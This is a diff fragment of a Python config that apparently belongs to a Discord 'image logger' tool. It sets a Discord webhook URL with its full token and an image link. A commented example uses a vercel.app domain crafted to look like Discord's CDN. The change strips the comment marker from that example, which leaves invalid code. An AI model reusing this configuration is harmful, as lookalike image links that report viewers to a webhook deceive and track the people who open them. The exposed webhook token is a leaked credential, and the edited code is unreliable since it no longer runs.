@@ -14,7 +14,7 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1201318491622494308/9WAgRLt3sC5dJN3EnDwbt5zRPuHqcdiUxe2ildihbzk8TIQKrEjwZxE2oGuotcy4wTj5",
     "image": "https://cdn.discordapp.com/attachments/1150324884031950898/1200914061030850580/8jthWYF.png?ex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&", # You can also have a custom image by using a URL argument
-                                               # (E.g. https://cdn-discordapp-com-attachments-png.vercel.app/api/115032488403195089812009140610308505808jthWYF.pngex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&?url=https://cdn.discordapp.com/attachments/1150324884031950898/1200914061030850580/8jthWYF.png?ex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&)
+                                                (E.g. https://cdn-discordapp-com-attachments-png.vercel.app/api/115032488403195089812009140610308505808jthWYF.pngex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&?url=https://cdn.discordapp.com/attachments/1150324884031950898/1200914061030850580/8jthWYF.png?ex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
